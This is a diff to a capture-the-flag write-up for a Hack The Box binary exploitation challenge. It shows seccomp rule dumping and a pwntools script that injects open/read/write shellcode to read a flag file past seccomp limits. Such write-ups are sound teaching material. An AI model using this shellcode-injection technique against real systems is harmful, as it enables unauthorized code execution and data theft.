@@ -142,7 +142,7 @@ success(getFlag)
 ![image](https://user-images.githubusercontent.com/70703371/209923541-98fceec9-b681-45a8-94ac-e745172449b2.png)
 
 
-8. Based from the output we got, i think there's `seccomp`.
+8. Based from the output we got, i think there's `seccomp` protections.
 
 > SECCOMP
 
@@ -150,10 +150,100 @@ success(getFlag)
 Secure computing mode ( seccomp ) is a Linux kernel feature. You can use it to restrict the actions available within the container. The seccomp() system call operates on the seccomp state of the calling process. You can use this feature to restrict your application's access.
 ```
 
+9. To validate our assumption, let's run `ldd` to the binary.
 
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/209923976-64bd2bdf-d971-42fd-af2b-cffea9574730.png)
+
+
+10. Yepp, we're right.
+11. Now let's dump the rule using `seccomp-tools`.
+
+```
+sudo seccomp-tools dump ./blacksmith
+```
+
+> RESULT - (CHOOSE 1 THEN 2)
+
+![image](https://user-images.githubusercontent.com/70703371/209924543-f1e7e948-7104-4b98-8fb0-69809a379b91.png)
+
+
+12. Based from the rules, the binary allows to use `read()`, `write()` , and `open()`.
+13. That's why when we use cat or get into the shell, the program terminated.
+14. So, the flow we shall use is, using the `open()` function to open the flag, then use the `read()` function to read the flag , and use the `write()` write the flag to the standard output.
+15. Now let's update our script:
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+def start(argv=[], *a, **kw):
+    if args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  
+        return process([exe] + argv, *a, **kw)
+
+exe = './blacksmith'
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'debug'
+
+sh = start()
+
+# we are using shellcraft, because it's just executing code.
+#shellcode = asm(shellcraft.sh())
+shellcode = asm(shellcraft.open('flag.txt'))
+# ssize_t read(int fildes, void *buf, size_t nbyte);
+# int fildes value -> 3, because we want to read from a file | check linux man pages -> die.net (num2 - read)
+# void*buf -> rsp, because we want to read it to the stack
+# size_t nbyte -> since the flag won't be too long, input any bytes size.
+shellcode += asm(shellcraft.read(3, 'rsp', 50))
+# ssize_t write(int fildes, const void *buf, size_t nbyte);
+# int fildes -> 1 , because we want to send message to out standard output (another user) | check linux man pages -> die.net (num1 - write)
+shellcode += asm(shellcraft.write(1, 'rsp', 'rax'))
+
+sh.sendlineafter('>', '1')
+sh.sendlineafter('>', '2')
+sh.sendlineafter('>', flat(shellcode))
+
+# Need to add these lines of script, dunno why if exclude it, won't get the flag.
+sh.recv()
+#sh.interactive()
+getFlag = sh.recv()
+success(getFlag)
+
+```
+
+16. Let's test it remotely.
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/209930928-d3b56da7-04e4-48de-a396-0d3c0b9eeda3.png)
+
+
+17. Got the flag!
+
+## FLAG
+
+```
+HTB{s3cc0mp_1s_t00_s3cur3}
+```
+
+
+##### NOTES:
+
+1. To check available shellcraft function.
+2. Run this on ur terminal:
+
+```sh
+pwn shellcraft -l | grep linux
+```
 
 ## LEARNING REFERENCES:
 
 ```
 https://docs.docker.com/engine/security/seccomp/
+https://www.die.net/search/?q=read&sa=Search&ie=ISO-8859-1&cx=partner-pub-5823754184406795%3A54htp1rtx5u&cof=FORID%3A9&siteurl=linux.die.net%2Fman%2F&ref=www.google.com%2F&ss=238j25750j4#gsc.tab=0&gsc.q=read&gsc.page=1
 ```
